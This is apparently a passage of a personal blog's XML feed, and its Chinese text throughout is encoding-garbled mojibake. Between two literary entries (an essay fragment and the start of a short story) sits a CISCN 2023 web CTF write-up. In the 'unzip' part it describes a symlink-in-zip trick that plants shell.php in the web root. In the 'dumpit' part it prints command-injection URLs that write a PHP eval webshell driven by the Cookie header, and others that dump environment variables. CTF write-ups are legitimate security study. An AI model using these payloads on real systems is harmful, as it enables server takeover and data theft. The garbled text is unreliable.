·è¿‡æ¥äº†ï¼Œåœ¨å‡ºç§Ÿå±‹é‡Œé€šå®µåˆ·è¯­æ–‡çš„æ—¶å€™ä¹Ÿæ²¡æœ‰ç»æœ›è¿‡ï¼Œç«èµ›ç‚¸äº†ç°æºœæºœçš„å›ç­çš„æ—¶å€™ä¹Ÿæ²¡æœ‰ç»æœ›è¿‡ï¼Œè¢«ç­ä¸»ä»»åœ¨åŠå…¬å®¤éª‚çš„å¿«è¦å“­æ­»çš„æ—¶å€™ä¹Ÿæ²¡æœ‰ç»æœ›è¿‡ã€‚å¯æ˜¯ä¸ºä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆç°åœ¨çœ‹ä¸åˆ°å¸Œæœ›äº†å‘¢ï¼Ÿå¥½åƒçªç„¶è§‰å¾—ä¸€è¾ˆå­ä¹Ÿå°±è¿™æ ·äº†ã€‚æƒ³è¦æŠ“ä½çš„ä¸œè¥¿å¤ªå¤šäº†ï¼Œå¯æˆ‘å§‹ç»ˆç¢Œç¢Œæ— ä¸ºä¸æ˜¯å—ã€‚</p><p>ä»¥åä¼šå¹¸ç¦çš„å§ï¼Ÿ<br>ä¼šæœ‰æ—¶é—´çœ‹æ—¥å‡ºæ—¥è½ï¼Œ<br>ä¼šé‡åˆ°æƒŠè‰³è‡ªå·±ä¸€ç”Ÿçš„äººå§ã€‚</p><p>é’æ˜¥åå¹´ï¼š<br>ä¸‰å¹´ï¼Œ<br>ä¸‰å¹´ï¼Œ<br>å››å¹´ã€‚<br>ç„¶åæ˜¯æ— æ•°ä¸ªåå¹´ã€‚</p><p>æ¯ä¸€å¤©éƒ½ç”Ÿæ´»åœ¨åœ°ä¸Šï¼Œ<br>çŸ­æš‚çš„é£èµ·ï¼Œ<br>åƒæ¢¦é‡Œé‚£æ ·ï¼Œ<br>è¿…é€Ÿè½åœ°ï¼Œ<br>æ°¸è¿œè¢«è¿½é€ï¼Œ<br>æ°¸è¿œã€‚</p><p>æˆ‘è¯´ï¼Œ<br>ä»€ä¹ˆæœ€é‡è¦å‘¢ï¼Œ<br>æˆ‘è¯´ï¼Œ<br>ä»Šæ™šçš„æœˆäº®åœ†ä¸åœ†ï¼Œ<br>æˆ‘è¯´ï¼Œ<br>æ˜å¤©æ˜¯ç¾å¥½çš„ä¸€å¤©å—ã€‚</p><p>æˆ‘ä¸è¦äº†ï¼Œ<br>æˆ‘ä¸è¦æˆ‘çš„äººç”Ÿå°±è¿™æ ·äº†ï¼Œ<br>ä»¥å‰è§‰å¾—ç”¨å°½å…¨åŠ›æŠ˜æ–­ç¾½æ¯›é£èµ·æ¥çš„å°é¸Ÿå¾ˆé…·ï¼Œ<br>ä½†æˆ‘ä¸è¦äº†ã€‚</p><p>é…’å§å…³é—¨ï¼Œ<br>æˆ‘ä¾¿ç¦»å»ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn-2023-web-éƒ¨åˆ†writeup</title>
      <link href="/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/"/>
      <url>/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="å…³äºæœ¬æ¬¡å›½èµ›"><a href="#å…³äºæœ¬æ¬¡å›½èµ›" class="headerlink" title="å…³äºæœ¬æ¬¡å›½èµ›"></a>å…³äºæœ¬æ¬¡å›½èµ›</h2><p>å¯ä»¥è¯´æš´éœ²äº†å¾ˆå¤šé—®é¢˜ï¼Œå­¦çš„çŸ¥è¯†ç‚¹å¤ªå°‘äº†å¾ˆå¤šé¢˜æ ¹æœ¬æ²¡æ€è·¯ï¼Œå…¨ç¨‹åªæœ‰miscè¾“å‡ºï¼Œwebå”¯ä¸€æœ¬æ¥åº”è¯¥èƒ½åšå‡ºæ¥çš„SQLåç‰¢ä¸€å¤©æ‰è¿›è‡ªå·±çš„æ€ç»´å®šå¼é‡Œé¢çš„ï¼Œç‹ ç‹ çš„è¢«å‡ºé¢˜äººå‘å‚»äº†ã€‚æœ€åæ— ç¼˜å¤èµ›ï¼Œä¹Ÿæ²¡ä»€ä¹ˆå¥½é—æ†¾çš„ï¼Œå®åŠ›å¦‚æ­¤ï¼Œå°±æ˜¯æœ‰ç‚¹å¯¹ä¸èµ·é˜Ÿå‹å’Œå·¥ä½œå®¤ï¼Œç»™ä»–ä»¬ä¸¢è„¸äº†å‘œå‘œå‘œï¼</p><p>æ‰€ä»¥ä»ç°åœ¨å¼€å§‹å†³å®šèŠ±æ›´å¤šå¿ƒæ€åœ¨CTFä¸Šäº†</p><blockquote><p>CTFä¸æ˜¯webçš„å…¨éƒ¨ï¼Œä½†æˆ‘æ°¸è¿œä¸ä¼šå¿˜è®°å“ªäº›ç†¬å¤œåšæ‹›æ–°é¢˜çš„å¤œæ™šÂ·Â·Â·Â·Â·Â·</p></blockquote><hr><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>ğŸ’š æœ‰ä¸€ä¸ªå‚çœ‹æ–‡ä»¶ï¼š <a href="https://forum.butian.net/share/906">https://forum.butian.net/share/906</a></p><hr><h3 id="é¢˜ç›®ç¯å¢ƒ"><a href="#é¢˜ç›®ç¯å¢ƒ" class="headerlink" title="é¢˜ç›®ç¯å¢ƒ"></a>é¢˜ç›®ç¯å¢ƒ</h3><p>é¢˜ç›®ç»™å‡ºæºç ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Â &lt;?php</span><br><span class="line">Â error_reporting(0);</span><br><span class="line">Â highlight_file(__FILE__);</span><br><span class="line">Â â€‹</span><br><span class="line">Â $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">Â if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;</span><br><span class="line">Â  Â  Â exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">Â &#125;;</span><br><span class="line">Â â€‹</span><br><span class="line">Â //only this!</span><br></pre></td></tr></table></figure><p>ç„¶åæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„æ¥å£ã€‚</p><hr><p>åšé¢˜åˆ†æ</p><p>æ ¹æ®å‚è€ƒæ–‡ç« </p><ul><li>é¦–å…ˆä¸Šä¼ zipè¿™ä¸ªåº”è¯¥æ˜¯ä¸ç”¨æ”¹çš„ï¼Œæœ‰æ¯”è¾ƒå¼ºçš„éªŒè¯ï¼Œè€Œä¸”åé¢ä¹Ÿæœ‰unzipçš„æ“ä½œï¼Œæ‰€ä»¥åº”è¯¥å°±æ˜¯ä¸Šä¼ zipæ–‡ä»¶äº†</li><li><code>cd /tmp &amp;&amp; unzip -o</code>åº”è¯¥æ˜¯è§£é¢˜çš„å…³é”®ï¼Œå‚è€ƒæ–‡ç« é‡Œé¢ä¹Ÿæœ‰æåˆ°ï¼Œçœ‹ä»–çš„åšæ³•æ¶‰åŠåˆ°è½¯è¿æ¥ï¼Œå»çœ‹çœ‹ã€‚</li><li>å‘ç°è½¯é“¾æ¥é…åˆzipæ–‡ä»¶ä¸Šä¼ å¯æ˜¯å®ç°ä»»æ„æ–‡ä»¶è¯»å–</li><li>è€Œ<code>unzip -o</code>æ˜¯<code>ä¸å¿…å…ˆè¯¢é—®ç”¨æˆ·ï¼Œunzipæ‰§è¡Œåè¦†ç›–åŸæœ‰çš„æ–‡ä»¶</code> -oå‚æ•°ç›®å‰çŒœæµ‹å¯èƒ½åªæ˜¯ä¸ºäº†æ–¹ä¾¿é€‰æ‰‹é‡å¤ä¸Šä¼ ä¸€æ ·çš„åå­—çš„å‹ç¼©åŒ…ï¼Œæ‰€ä»¥å…³é”®æ˜¯è¿™ä¸ªè§£å‹ç¼©æ“ä½œï¼Œé…åˆè½¯é“¾æ¥ï¼Œä¹Ÿå°±æ˜¯ä¼šæ‰§è¡Œè½¯é“¾æ¥å»ä»»æ„æ–‡ä»¶è¯»å–</li><li>åŸæ¥<code>-o</code> çš„ç”¨å¤„æ˜¯ï¼Œå…ˆä¸Šä¼ ä¸€ä¸ªè½¯é“¾æ¥çš„å‹ç¼©åŒ…æŒ‡å‘ç‹ç‚¸æ ¹ç›®å½•ï¼Œç„¶åå†ä¸Šä¼ ä¸€ä¸ªåŒæ ·åç§°çš„å‹ç¼©åŒ…åŒ…å«webshellï¼Œç„¶åè®¿é—®,å°±é€ æˆrceäº†</li></ul><hr><p>ä¸Šä¼ è¯¥exp1.zipè§£å‹å‡ºé‡Œè¾¹çš„æ–‡ä»¶ä¹Ÿæ˜¯è½¯è¿æ¥<code>/var/www/html</code>ç›®å½•ä¸‹ã€‚æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯æƒ³åŠæ³•æ„é€ ä¸€ä¸ªgethsellæ–‡ä»¶è®©gethsellæ–‡ä»¶æ­£å¥½è§£å‹åœ¨<code>/var/www/html</code>æ­¤æ—¶å°±å¯ä»¥getshellã€‚</p><p>æ„é€ ç¬¬äºŒä¸ªå‹ç¼©åŒ…ï¼Œæˆ‘ä»¬å…ˆåˆ›å»ºä¸€ä¸ªfilesç›®å½•(å› ä¸ºä¸Šä¸€ä¸ªå‹ç¼©åŒ…é‡Œè¾¹ç›®å½•å°±æ˜¯files)ï¼Œåœ¨filesç›®å½•ä¸‹å†™ä¸€ä¸ªshellæ–‡ä»¶ï¼Œåœ¨å‹ç¼©åˆ›å»ºçš„filesç›®å½• æ­¤æ—¶å‹ç¼©åŒ…ç›®å½•æ¶æ„æ˜¯ï¼š<code>test/shell.php.</code>å½“æˆ‘ä»¬ä¸Šä¼ è¿™ä¸ªå‹ç¼©åŒ…æ—¶ä¼šè¦†ç›–ä¸Šä¸€ä¸ªç›®å½•ï¼Œä½†æ˜¯filesç›®å½•è½¯é“¾æ¥æŒ‡å‘<code>/var/www/html</code> ã€‚è§£å‹çš„æ—¶å€™ä¼šæŠŠ<code>shell.php</code>æ”¾åœ¨<code>/var/www/html</code>ï¼Œæ­¤æ—¶æˆ‘ä»¬è¾¾åˆ°äº†getsehllçš„ç›®çš„</p><hr><h3 id="sillyçš„wp"><a href="#sillyçš„wp" class="headerlink" title="sillyçš„wp"></a>sillyçš„wp</h3><p>zipå¯ä»¥æ‰“åŒ…è½¯é“¾æ¥ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªæŒ‡å‘&#x2F;var&#x2F;www&#x2F;htmlçš„è½¯è¿æ¥</p><p>ç„¶åå°†è½¯è¿æ¥å‹ç¼©æ‰“åŒ…ï¼Œä¸ºexp1.zip</p><p>ä¸Šä¼ åˆ°æœåŠ¡å™¨è§£å‹ï¼Œæ­¤æ—¶tmpç›®å½•å°±æœ‰ä¸€ä¸ªæŒ‡å‘&#x2F;var&#x2F;www&#x2F;htmlçš„è½¯è¿æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled.png"></p><p>åˆ æ‰filesè½¯è¿æ¥ï¼Œåˆ›ä¸€ä¸ªfilesæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ä¸€ä¸ªwebshell</p><p>å‹ç¼©filesï¼Œå¾—åˆ°å‹ç¼©åŒ…ï¼Œexp2.zip</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled1.png"></p><p>æœåŠ¡å™¨é‡Œè§£å‹ï¼Œæ­¤æ—¶è®¿é—®&#x2F;files&#x2F;shell.phpå‘ç°æ–‡ä»¶å­˜åœ¨ï¼Œwebshellå·¥å…·è¿æ¥å³å¯</p><hr><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>é¢˜ç›®ç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure><h3 id="åˆå®¡"><a href="#åˆå®¡" class="headerlink" title="åˆå®¡"></a>åˆå®¡</h3><ul><li>é¢˜ç›®æç¤ºflagåœ¨&#x2F;flag</li><li>å…ˆè®¿é—®<code>?db=ctf&amp;table_2_query=flag1</code> flag1åˆ°5éƒ½è®¿é—®äº†ï¼Œæç¤ºè®©rceä¸€ä¸ªflagï¼Œåˆæ­¥çŒœæµ‹æ˜¯SQLæ³¨å…¥å†™æ–‡ä»¶getshellâ€¦</li><li>queryèµ›é“æ„é€ çš„è¯­å¥æ˜¯ï¼š<ul><li>select * from ctf.flag1</li><li>å°è¯•æ„é€ æŸ¥è¯¢å…¶ä»–è¡¨ï¼š</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.global_variables where VARIABLE_NAME=&#x27;secure_file_priv&#x27;</span><br><span class="line">array(4) &#123; [&quot;VARIABLE_NAME&quot;]=&gt; string(16) &quot;SECURE_FILE_PRIV&quot; [0]=&gt; string(16) &quot;SECURE_FILE_PRIV&quot; [&quot;VARIABLE_VALUE&quot;]=&gt; string(0) &quot;&quot; [1]=&gt; string(0) &quot;&quot; &#125;</span><br></pre></td></tr></table></figure><p>å‘ç°<code>secure_file_priv</code> ä¸ºç©ºï¼Œæ˜¯å¯ä»¥å†™æ–‡ä»¶çš„ã€‚</p><ul><li>ç»§ç»­æŸ¥çœ‹é¢˜ç›®ç¯å¢ƒæ˜¯å¦æœ‰å†™æ–‡ä»¶æƒé™ï¼šç®€å•è¾“å…¥ä¸€äº›æŸ¥è¯¢è¯­å¥ï¼Œå‘ç°æ˜¯æ²¡æœ‰è¯»å†™æƒé™çš„ï¼Œï¼Œå½“æ—¶å°±åœ¨è¿™é‡Œçº ç»“äº†å¾ˆä¹…</li></ul><h3 id="æˆ‘çš„æ€è·¯"><a href="#æˆ‘çš„æ€è·¯" class="headerlink" title="æˆ‘çš„æ€è·¯"></a>æˆ‘çš„æ€è·¯</h3><ul><li><code>http://eci-2zehs7fgoxn8owsdgy7q.cloudeci1.ichunqiu.com:8888/?db=ctf&amp;table_2_query=flag1Â whereÂ 1=1Â andÂ 1=2</code> æŠŠåé¢çš„1&#x3D;2æ”¹æˆä¸€ä¸ªboolåˆ¤æ–­å¥ï¼Œé¢˜ç›®ä¼šè¿”å›æŸ¥è¯¢ç»“æœæˆ–è€…bool(false)ï¼Œåˆ©ç”¨è¿™é‡Œçš„boolåˆ¤æ–­è¿›è¡Œboolç›²æ³¨</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-1024x460.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled-1-1024x396.png" style="zoom:50%;" /><ul><li>ä½†æ˜¯è¿™é‡Œè·‘äº†ä¸€ä¸‹ï¼Œlengthå‡½æ•°æ˜¯å¯ä»¥ç”¨çš„ï¼Œä½†æ˜¯load_fileå…¨æ˜¯FALSEï¼ŒTIMä½¬å½“æ—¶å°±è¯´äº†å¯èƒ½æ²¡æœ‰load_fileä¹Ÿå°±æ˜¯æ²¡æœ‰fileæƒé™ï¼Œä½†æ˜¯æˆ‘ä¸ä¿¡é‚ªå‘œå‘œå‘œï¼Œç»“æœçœŸçš„æ²¡æœ‰å•Šå•Šå•Š</li><li>å½“æ—¶åœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œæ€»æƒ³å°è¯•load_fileå»è¯»&#x2F;flagçš„å†…å®¹ï¼Œæ¢å„ç§boolè¯­å¥ï¼Œåå…­ç¼–ç ï¼Œç»“æœå°±æ˜¯åç‰¢ä¸€å¤©ã€‚ã€‚</li></ul><h3 id="æ­£è§£"><a href="#æ­£è§£" class="headerlink" title="æ­£è§£"></a>æ­£è§£</h3><ul><li>ä¸€å¼€å§‹å‘ç°äº†é¢˜ç›®è¿›è¡Œäº†ä¸€äº›è¿‡æ»¤ï¼Œæ¯”å¦‚<code>;</code>è¢«è¿‡æ»¤äº†ï¼Œå°±æ²¡æƒ³è¿‡ç¼–ç ç»•è¿‡å•¥çš„ã€‚ã€‚</li><li>äº‹å®ä¸Šï¼Œç›´æ¥ç”¨<code>%0a</code> è¿›è¡Œç¼–ç ç»•è¿‡ã€‚</li><li>ç„¶åå°±æ˜¯è¿™ä¸ªé¢˜ç›®ä½¿ç”¨äº†dumpè¿›è¡Œå¤‡ä»½ï¼Œä½†æ˜¯mysqlå¹¶æ²¡æœ‰è‡ªå¸¦çš„dumpç›¸å…³å‡½æ•°ï¼Œæ‰€ä»¥å®ƒä¸€å®šæ˜¯è°ƒç”¨äº†ç³»ç»Ÿå‘½ä»¤è¿›è¡Œdumpçš„ï¼Œæ‰€ä»¥ä¸€äº›ç®¡é“ç¬¦è¿˜æœ‰<code>;</code>ä»€ä¹ˆçš„éƒ½æ˜¯å¯ä»¥å°è¯•çš„ï¼Œæœ€åä¹Ÿå¯ä»¥ä½¿ç”¨execè¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œç”±äºé¢˜ç›®æ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥è€ƒè™‘ä½¿ç”¨ä¸€å¥è¯æœ¨é©¬åˆ°æ–‡ä»¶ã€‚</li><li>åœ¨å†™çš„æ—¶å€™å‘ç°è¿‡æ»¤äº†$ï¼Œå¯ä»¥é€šè¿‡<strong>åè®®å¤´</strong>è·å–rceå‚æ•°ã€‚lsæ²¡é—®é¢˜ï¼Œcatå¯èƒ½ç”±äºæƒé™é—®é¢˜å¾—ä¸åˆ°flagã€‚</li><li>åæ¥å‘ç°envç¯å¢ƒå˜é‡ä¸­æœ‰flagä¿¡æ¯ï¼Œå¯èƒ½æ˜¯ç”Ÿæˆé¶æœºåŠ¨æ€Flagçš„æ—¶å€™å°†Flagå†™å…¥äº†ç¯å¢ƒå˜é‡ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;http://xxx/?db=ctf&amp;table_2_dump=flag1%0Aecho%20%22%3C?php%20@eval(getallheaders()[%27Cookie%27]&gt;)?%3E%22%20%3E%20%22/app/log/1.php%22%0A</span><br><span class="line"># echo &quot;&lt;?php eval(getallheaders()[&#x27;Cookie&#x27;])?&gt;&quot; &gt; &quot;/app/log/1.php&quot;</span><br></pre></td></tr></table></figure><ul><li>æˆ–è€…ç›´æ¥<code>?db=-r &quot;1.php&quot; &quot;&lt;?=eval(phpinfo()) ?&gt;&quot;&amp;table_2_dump=flag1</code> PHPinfoä¸­æŸ¥çœ‹ç¯å¢ƒå˜é‡get flagã€‚</li><li>æˆ–è€…ç›´æ¥<code>?db=ctf&amp;table_2_dump=%0Aenv</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—äº†å—</title>
      <link href="/2023/05/18/%E7%AE%97%E4%BA%86%E5%90%97/"/>
      <url>/2023/05/18/%E7%AE%97%E4%BA%86%E5%90%97/</url>
      
        <content type="html"><![CDATA[<p>â€œå¥½æ¶å¿ƒâ€ï¼Œåœ¨åå‡ºç¬¬ä¸€å£çƒŸä¹‹åï¼Œå¥¹å°†è§†çº¿ä»çª—å¤–ç§»å¼€ã€‚çª—å­å¤–é¢æ˜¯ä¸€å¤§ç‰‡å†œç”°ï¼Œåœ¨è¿™ä¸ªé è¿‘éƒŠåŒºçš„åœ°æ–¹ï¼Œå·¦è¾¹èƒ½éšçº¦çœ‹åˆ°åŸå¸‚é‡Œå„ç§é¢œè‰²çš„é«˜æ¥¼ï¼Œå³è¾¹æ˜¯å‡ ä¸ªå°å·¥å‚ï¼Œæ•£å‘ç€å‘éœ‰çš„é£Ÿç‰©çš„å‘³é“ã€‚è¿™ç‰‡å†œç”°å¤¹æ‚åœ¨ä¸¤è€…ä¹‹é—´ï¼Œè®©å¥¹æƒ³èµ·é¹¤ç«‹é¸¡ç¾¤è¿™ä¸ªè¯ï¼Œè™½ç„¶å¥¹å¹¶ä¸æ˜ç™½è¿™æ˜¯ä¸€ä¸ªè¤’ä¹‰è¯è¿˜æ˜¯è´¬ä¹‰è¯ã€‚</p><p>å¥¹ç›¯ç€ç”°é‡Œçš„ä¸€ä¸ªè€å¤ªå¤ªï¼ŒæŒ‘ç€æ‹…å­åœ¨ä¸€æ¡å¾ˆç®€é™‹çš„ç”°é“ä¸Šèµ°ï¼Œè¡£ç€å’Œå•†åœºè¶…å¸‚é‡Œä¹°èœçš„é˜¿å§¨å¹¶æ²¡å¤ªå¤§åŒºåˆ«ï¼Œå”¯ä¸€ä¸åŒçš„è„šä¸Šé‚£åŒæ²¾æ»¡äº†æ³¥çš„å¸ƒé‹ï¼Œè¿™åœ¨åŸé‡Œæ˜¯è§ä¸åˆ°çš„ã€‚è€å¤ªå¤ªç¼“æ…¢çš„èµ°å‘ä¸€æ¡æ°´æ²Ÿï¼Œå°†æ‹…å­ä¸¤è¾¹çš„å¤§æ°´æ¡¶ç››æ»¡æµ‘æµŠçš„æ°´ã€‚å¥¹çœ‹ç€è¿™ä¸€å¹•ï¼Œè„‘å­é‡Œæµ®ç°çš„ç”»é¢å´æ˜¯å¤šå¹´ä»¥å‰å¥¹åœ¨ä¸€æ‰€å°å­¦é™„è¿‘çš„å°æ‘Šå­ä¸Šåƒçš„äº”å…ƒä¸€ç¢—çš„æ±¤é¢ï¼Œå–é¢çš„è€å©†å©†å’Œç”°é‡Œè¿™ä¸ªè€å¤ªå¤ªç¥æƒ…ä½“æ€å¦‚å‡ºä¸€è¾™ï¼Œéƒ½æ˜¯é‚£ç§çœ‹äº†å°±ä¼šæ†æ¶éƒ½å¸‚ç¹åçš„ç±»å‹ã€‚</p><p>å¥½æ¶å¿ƒï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåªæœ‰è¿™ä¸‰ä¸ªå­—ä¸€ç›´è¦ç»•åœ¨è€³è¾¹ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆè€Œæ¶å¿ƒï¼Œåªæ˜¯ï¼Œå¥¹è§‰å¾—æœ‰ç‚¹ï¼Œæƒ³è·³è¿›é‚£ä¸ªè‡­æ°´æ²Ÿé‡Œã€‚é‚£æ¡æ°´æ²Ÿï¼Œå¾ˆå°ï¼Œå¤§æ¦‚åå¤šå¹³ç±³ï¼Œæ•´ä½“å‘ˆç°ä¸€ä¸ªâ€™Wâ€™çš„å½¢çŠ¶ã€‚æ°´é¢ä¸Šå¸ƒæ»¡äº†è¯´ä¸æ¸…æ¥šé¢œè‰²çš„è—“ç±»ï¼Œå‘¨å›´å…¨æ˜¯æ‚è‰ï¼Œå’Œäº›è®¸ç™½è‰²å¡‘æ–™ï¼Œè€å¤ªå¤ªåˆšæ‰èˆ€æ°´æ—¶åˆ¶é€ çš„æ¶Ÿæ¼ªè¿˜åœ¨æ‰©æ•£ï¼ŒæƒŠæ‰°äº†é™„è¿‘çš„é‡è™«ï¼Œå…¨éƒ½åœæ­¢äº†è’å™ªã€‚è·³è¿›å»çš„è¯ï¼Œå…¨èº«ä¸€å®šä¼šå˜å¾—å¾ˆè‡­å§ï¼Ÿä¼šä¸ä¼šæœ‰æ­»é±¼åœ¨é‡Œé¢ï¼Ÿè¯´ä¸å®šè¿˜ä¼šæœ‰å°èŒèšªé’»è¿›æˆ‘çš„è¡£æœé‡Œé¢ï¼Œå“ˆå“ˆï¼</p><p>è¿™æ˜¯å¥¹ä»Šå¤©ä¸çŸ¥é“ç¬¬å‡ æ¬¡å€Ÿç€ä¸Šå•æ‰€çš„ç†ç”±å‡ºæ¥æŠ½çƒŸäº†ï¼Œè¢«åˆ†é…åˆ°è¿™ä¸ªåè¿œéƒ¨é—¨åšæŠ€æœ¯é¡¾é—®ï¼Œå¥¹æœ¬å‘èª“è¦å¤§å¹²ä¸€åœºï¼Œå´å‘ç°è¿™é‡Œçš„äººä»¬å¥½åƒå¹¶ä¸å¤ªéœ€è¦å¥¹ã€‚æ¯•ç«Ÿï¼Œå¥¹è¿™ä¸ªå¹´è½»çš„ï¼Œé’æ¶©çš„æŠ€æœ¯é¡¾é—®ï¼Œå®åœ¨æ˜¯å¾ˆéš¾è®©äººæœ‰è¯·æ•™çš„æ¬²æœ›ã€‚é¢†å¯¼ä¹Ÿå¯¹å¥¹æ€åº¦ä¸æ˜ï¼Œæ‹¿ç€ä¸ä½çš„å·¥èµ„å´ä¸å¹²ä»€ä¹ˆäº‹æƒ…ï¼Œä»—ç€æœ‰æ€»éƒ¨çš„æ’‘è…°è¿˜ä¸èƒ½å¯¹å¥¹åšä»€ä¹ˆã€‚å¥½å§ï¼Œæœç„¶è¿˜æ˜¯å·æ‡’èˆ’æœï¼Œåœ¨å­¦æ ¡é‡Œé€ƒè¯¾é€ƒå¤šäº†ï¼Œé’»ç©ºå­è¿™ç§äº‹æƒ…ï¼Œå¥¹æ¯”è°éƒ½æ“…é•¿ã€‚</p><p>æŠ½å®Œæœ€åä¸€å£çƒŸï¼Œåˆå¾—å›å»äº†ï¼Œè¿™è®©å¥¹è§‰å¾—çœ¼è§çš„æ™¯è‰²åˆè¿·äººäº†å‡ åˆ†ï¼Œå¤•é˜³çœŸçš„å¾ˆç¾ï¼Œå·¥å‚é‡Œæœ‰å·¥äººçš„å°å­©åœ¨æ‰“é—¹ï¼Œç”°é‡Œçš„èœå‡ æ—¶ä¼šç†Ÿâ€¦</p><p>å¯åœ¨å¥¹çš„æ€ç»ªå³å°†é£˜è¿œçš„æ—¶å€™ï¼Œåˆºè€³çš„ç”µè¯é“ƒå£°å“èµ·äº†ï¼Œä½¿å¥¹ä¸å¾—ä¸ç«‹å³æ¥é€šï¼Œç”šè‡³æ¥ä¸åŠçœ‹æ¥ç”µè€…æ˜¯è°ã€‚</p><p>â€œæ‚ ï¼Œå‘Šè¯‰ä½ ä¸€ä¸ªå¥½æ¶ˆæ¯ï¼â€</p><p>ä¸€ä¸ªç†Ÿæ‚‰çš„ç”·å£°ä¼ è¿›è€³æœµï¼Œè®©å¥¹æœ‰äº›é”™æ„•ï¼Œâ€œå””..â€</p><p>â€œæˆ‘æ˜¨æ™šä¸Šé™ªæˆ‘çˆ¸â€¦é™ªé«˜æ€»å–é…’ï¼Œä»–å–å¤šäº†ï¼Œæˆ‘æ±‚ä»–æŠŠä½ è°ƒå›æ¥ï¼Œè¿˜è¯´äº†ä½ å¥½å¤šå¥½è¯ï¼Œè¯´ä½ å¾ˆæœ‰å‘å±•å‰é€”ï¼Œä»–å°±åŒæ„äº†ï¼ä½ æ”¾å¿ƒï¼Œæœ‰æˆ‘æ‹…ä¿ï¼Œä½ ä¸‹å‘¨ä¸€å®šèƒ½å›æ¥ï¼â€</p><p>å¼ºå¿ç€ä¸çŸ¥ä»ä½•æ—¶å‡èµ·çš„åæ„Ÿå¬å®Œäº†ç”·äººçš„è¯ï¼Œè„‘å­é‡Œä¸çŸ¥é“è¯¥æƒ³ä»€ä¹ˆï¼Œä¸çŸ¥é“è¯¥ä»¥ä»€ä¹ˆæ ·çš„æƒ…ç»ªé¢å¯¹è¿™ä¸ªæ¶ˆæ¯ï¼Œä½†å¥¹æƒ³åˆ°äº†å¥¹åœ¨ç‰æ—è·¯çœ‹ä¸­çš„é‚£å¥—æˆ¿å­ï¼Œå°±å¿«å‡‘å¤Ÿé¦–ä»˜äº†ï¼Œå†åšæŒä¸¤ä¸‰å¹´å°±èƒ½é è‡ªå·±çš„åŠªåŠ›åœ¨è¿™ä¸ªä¸–ç•Œä¸Šæ‹¥æœ‰å±äºè‡ªå·±çš„ï¼Œåªå±äºè‡ªå·±çš„å®¶ã€‚â€œå“‡ï¼Œä¸æ„§æ˜¯ä½ 